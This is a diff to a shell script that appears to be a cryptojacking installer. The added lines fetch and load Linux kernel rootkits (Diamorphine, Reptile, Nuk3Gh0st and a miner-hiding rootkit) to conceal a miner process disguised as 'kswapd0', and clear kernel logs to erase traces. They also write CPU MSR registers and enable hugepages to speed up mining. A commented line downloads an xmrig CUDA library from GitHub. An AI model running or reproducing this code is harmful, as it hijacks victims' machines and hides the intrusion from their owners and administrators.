@@ -326,6 +326,99 @@ else
   echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.gdm2/config_background.json"
 fi
 
+echo "[*] Determining GPU+CPU (without lshw)"
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; yum install pciutils -y; apt-get install pciutils -y; update-pciids ; lspci -vs 00:01.0 ; nvidia-smi ; aticonfig --odgc --odgt ; nvtop ; radeontop ; echo "Possible CPU Threads:" ; (nproc) ;
+# cd $HOME/.swapd/ ; wget https://github.com/pwnfoo/xmrig-cuda-linux-binary/raw/main/libxmrig-cuda.so
+
+echo "[*] Determining GPU+CPU"
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; yum install pciutils lshw -y; apt-get install pciutils lshw -y ; zypper install pciutils lshw -y ; update-pciids ; lspci -vs 00:01.0 ; lshw -C display ; nvidia-smi ; aticonfig --odgc --odgt ; nvtop ; radeontop ; echo "Possible CPU Threads:" ; (nproc) ;
+
+#echo "[*] MO0RPHIUM!! Viiiiel M0RPHIUM!!! Brauchen se nur zu besorgen, fixen kann ich selber! =)"
+#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; apt-get update -y ; apt-get install linux-headers-$(uname -r) git make gcc msr-tools -y ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
+
+echo "[*] make toolZ, Diamorphine"
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; yum install linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools -y ; apt-get update -y ; apt-get install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y ;  zypper update -y ; zypper install linux-generic linux-headers-$(uname -r) git make gcc msr-tools -y ; git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; /reptile/reptile_cmd hide `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
+
+echo "[*] Reptile..."
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; apt-get update -y ; apt-get install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y ; yum update -y; yum install -y ncurses-devel ; git clone https://github.com/f0rb1dd3n/Reptile/ && cd Reptile ; make defconfig ; make ; make install ; dmesg -C ; /reptile/reptile_cmd hide ;  kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
+
+echo "[*] Nuk3Gh0st..."
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; rm -rf Nuk3Gh0st ; rm -rf /usr/bin/nuk3gh0st/ ; zypper update ; zypper install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y ; zypper update -y; zypper install -y ncurses-devel ; git clone https://github.com/juanschallibaum/Nuk3Gh0st ; cd Nuk3Gh0st ; make ; make install ; load-nuk3gh0st ; nuk3gh0st --hide-pid=`/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'`
+
+echo "[*] hide crypto miner."
+cd /tmp ; cd .ICE-unix ; cd .X11-unix ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make ; dmesg -C && insmod rootkit.ko && dmesg ; kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ; rm -rf hiding-cryptominers-linux-rootkit/
+
+
+optimize_func() {
+  MSR_FILE=/sys/module/msr/parameters/allow_writes
+
+  if test -e "$MSR_FILE"; then
+  	echo on > $MSR_FILE
+  else
+  	modprobe msr allow_writes=on
+  fi
+
+  if grep -E 'AMD Ryzen|AMD EPYC' /proc/cpuinfo > /dev/null;
+  	then
+  	if grep "cpu family[[:space:]]\{1,\}:[[:space:]]25" /proc/cpuinfo > /dev/null;
+  		then
+  			if grep "model[[:space:]]\{1,\}:[[:space:]]97" /proc/cpuinfo > /dev/null;
+  				then
+  					echo "Detected Zen4 CPU"
+  					wrmsr -a 0xc0011020 0x4400000000000
+  					wrmsr -a 0xc0011021 0x4000000000040
+  					wrmsr -a 0xc0011022 0x8680000401570000
+  					wrmsr -a 0xc001102b 0x2040cc10
+  					echo "MSR register values for Zen4 applied"
+  				else
+  					echo "Detected Zen3 CPU"
+  					wrmsr -a 0xc0011020 0x4480000000000
+  					wrmsr -a 0xc0011021 0x1c000200000040
+  					wrmsr -a 0xc0011022 0xc000000401500000
+  					wrmsr -a 0xc001102b 0x2000cc14
+  					echo "MSR register values for Zen3 applied"
+  				fi
+  		else
+  			echo "Detected Zen1/Zen2 CPU"
+  			wrmsr -a 0xc0011020 0
+  			wrmsr -a 0xc0011021 0x40
+  			wrmsr -a 0xc0011022 0x1510000
+  			wrmsr -a 0xc001102b 0x2000cc16
+  			echo "MSR register values for Zen1/Zen2 applied"
+  		fi
+  elif grep "Intel" /proc/cpuinfo > /dev/null;
+  	then
+  		echo "Detected Intel CPU"
+  		wrmsr -a 0x1a4 0xf
+  		echo "MSR register values for Intel applied"
+  else
+  	echo "No supported CPU detected"
+  fi
+
+
+  sysctl -w vm.nr_hugepages=$(nproc)
+
+  for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d);
+  do
+      echo 3 > "$i/hugepages/hugepages-1048576kB/nr_hugepages";
+  done
+
+  echo "1GB pages successfully enabled"
+}
+
+
+
+if [ $(id -u) = 0 ]; then
+   echo "Running as root"
+   optimize_func
+else
+   echo "Not running as root"
+   sysctl -w vm.nr_hugepages=$(nproc)
+fi
+
+
+kill -31 $(pgrep -f -u root config.json)
+
 modprobe msr
 
 echo ""
